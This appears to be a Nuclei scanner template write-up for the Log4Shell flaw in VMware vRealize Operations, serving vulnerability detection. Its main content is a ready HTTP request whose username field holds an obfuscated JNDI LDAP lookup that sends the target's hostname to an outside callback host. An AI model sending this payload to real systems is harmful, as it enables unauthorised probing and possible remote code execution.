# Nuclei Template: VMware vRealize Operations Tenant - JNDI Remote Code Execution (Apache Log4j)
**Template ID:** vrealize-operations-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`vrealize-operations-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
VMware vRealize Operations is susceptible to a critical vulnerability in Apache Log4j which may allow remote code execution in an impacted vRealize Operations Tenant application.

## Steps to reproduce / Exploit Payload
```http
POST /suite-api/api/auth/token/acquire HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Origin: {{RootURL}}
Referer: {{RootURL}}/ui/

{"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}","password":"admin"}
```

## References
- https://www.vmware.com/security/advisories/VMSA-2021-0028.html
- https://core.vmware.com/vmsa-2021-0028-questions-answers-faq
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- https://nvd.nist.gov/vuln/detail/CVE-2021-45046
- https://logging.apache.org/log4j/2.x/security.html
